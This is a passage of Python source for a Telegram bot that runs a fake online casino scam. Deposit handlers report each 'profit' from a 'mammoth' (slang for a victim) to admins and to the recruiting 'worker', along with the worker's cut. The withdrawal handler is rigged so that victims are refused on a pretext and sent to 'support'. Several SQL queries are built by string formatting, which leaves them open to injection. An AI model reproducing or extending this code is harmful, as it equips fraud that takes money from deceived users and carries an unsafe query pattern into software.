                                                        f"🏴‍☠️ Обчистил мамонта: <b>{username}</b> \n"
                                                        f"💸 Сумма пополнения: <b>{price}₽</b> \n"
                                                        f"└ Доля воркера: <b>{share}₽</b>")
            await call.message.edit_text(f'✅ Успешно! Баланс пополнен на <b>{price}₽</b>')
            ADMIN_ID = env.list('ADMIN_ID')
            for admin in ADMIN_ID:
                await worker_bot.send_message(admin, f"☠️ <b>Новый профит!</b>  🎰 CASINO \n\n"
                                                    f"🏴‍☠️ Обчистил мамонта: <b>{worker[1]}</b> \n"
                                                    f"💸 Сумма пополнения: <b>{price}₽</b> \n"
                                                    f"└ Доля воркера: <b>{share}₽</b>")
            try:
                await worker_bot.send_message(worker[0], f"☠️ <b>У тебя новый профит!</b>  🎰 CASINO \n\n"
                                                        f"🏴‍☠️ Мамонт: <b><a href='tg://user?id={user[0]}'>{user[3]}</a></b> \n"
                                                        f"💸 Сумма пополнения: <b>{price}₽</b> \n"
                                                        f"└ Твоя доля: <b>{share}₽</b>")
            except Exception as e:
                print(e)
                pass
        else:
            await call.message.answer("Оплата не найдена!")

@dp.callback_query_handler(text='withdraw')
async def withdraw(call: CallbackQuery):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f'SELECT * FROM users_casino WHERE id = {call.from_user.id}').fetchone()
    if user[5] == 1:
        return
    if user[2] < 1000:
        await bot.send_message(call.from_user.id, f"Недостаточно средств для вывода!")
    else:
        await bot.send_message(call.from_user.id, f"💁🏻‍♀️ Введите свои реквизиты без + в начале \n\n"
                                                  f"По правилам проекта: вывод доступен только на реквизиты с которых было сделано пополнение. \n\n"
                                                  f"<b>Бот выводит всю сумму Вашего баланса</b>")
        await Withdraw.q1.set()

@dp.message_handler(state=Withdraw.q1)
async def withdraw_q1(message: types.Message,state:FSMContext):
    with sqlite3.connect(BD_PATH) as cursor:
        user = cursor.execute(f"SELECT * FROM users_casino WHERE id = {message.from_user.id}").fetchone()
        worker = cursor.execute("SELECT * FROM worker WHERE referal_code = ?",(user[1],)).fetchone()
    if user[5] == 1:
        return

    withdraw_form = InlineKeyboardMarkup(
        inline_keyboard = [
            [
                InlineKeyboardButton(text="💸ВЫВЕСТИ💸", callback_data=f"withdraw_balance,{message.from_user.id},casino"),
                InlineKeyboardButton(text="❌ОТМЕНИТЬ❌", callback_data=f"no_withdraw_balance,{message.from_user.id},{user[2]},casino")
            ]
        ]
    )        
    if message.text.isdigit():
        if int(message.text) == worker[2]:
            await message.answer(f"🔔Вы <b>успешно</b> подали заявку на вывод денежных средств! \n"
                                 f"Рассмотрение заявки происходит в течение часа! \n\n"
                                 f"<b>Сумма:</b> {user[2]} \n"
                                 f"<b>Статус:</b> обрабатывается… \n\n"
                                 f"Мы <b>уведомим</b> Вас, о статусе вывода денежных средств!")
            await worker_bot.send_message(worker[0], f"@{message.from_user.username} создал запрос на вывод средств \n"
                                                    f"💸 Сумма: <b>{user[2]}</b>", reply_markup=withdraw_form)
            with sqlite3.connect(BD_PATH) as cursor:
                cursor.execute("UPDATE users_casino SET balance = 0 WHERE id = ?", (message.from_user.id,))
            await state.finish()
        else:
            TS_btn = InlineKeyboardMarkup(
                inline_keyboard = [
                    [
                        InlineKeyboardButton(text="Тех. Поддержка", url="tg://resolve?domain=RoyalCasSupps")
                    ]
                ]
            )        
            await message.answer(f"🚫 <b>Вам было отказано в выводе средств!</b> \n\n"
                                 f"👮‍♂️ Вы пытаетесь вывести на реквизиты, с которых НЕ пополняли \n"
                                 f"❗️ <b>Обратитесь в техническую поддержку</b>", reply_markup=TS_btn)
            await worker_bot.send_message(worker[0], f"🔥Мамонт @{message.from_user.username} запросил вывод {user[2]} на свои реквизиты, произошла автоматическая отмена🔁")
    else:
        await message.answer("Вы ввели не реквизиты! \n"
                             "Вы вернулись в главное меню", reply_markup=scenes.main)
    await state.finish()

@dp.callback_query_handler(text="cancel", state="*")
async def cancel_btn(call: types.CallbackQuery, state: FSMContext):
    await state.finish()
    await bot.delete_message(chat_id=call.from_user.id, message_id=call.message.message_id)
    await call.message.answer("Отмена", reply_markup=scenes.main)

# start bot
if __name__ == '__main__':
    executor.start_polling(dp)